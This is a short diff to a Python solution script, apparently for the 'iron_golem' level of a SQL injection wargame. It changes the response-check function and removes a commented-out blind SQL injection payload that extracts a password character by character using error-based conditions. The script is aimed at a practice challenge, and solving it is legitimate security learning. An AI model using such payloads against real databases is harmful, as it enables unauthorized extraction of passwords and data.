@@ -4,8 +4,12 @@ import los
 from getpass import getpass
 
 
-def check_func(response: str) -> bool:
-    return 'select id from prob_iron_golem' in response
+def check_func(*args) -> bool:
+    '''
+    check string in response of request
+    args[0]: response
+    '''
+    return 'select id from prob_iron_golem' in args[0]
 
 
 def main():
@@ -43,12 +47,6 @@ def main():
     len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
-    '''
-    payload = "'||if(ord(mid(pw,%s,1))%s,1,(select 1 union select 2))#"
-    param = dict(pw=payload)
-    result = los.find_binary(
-        url, param, check_func, 32, 127, len_of_key, cook)
-    '''
 
     result = ''
     num_of_requests = 0
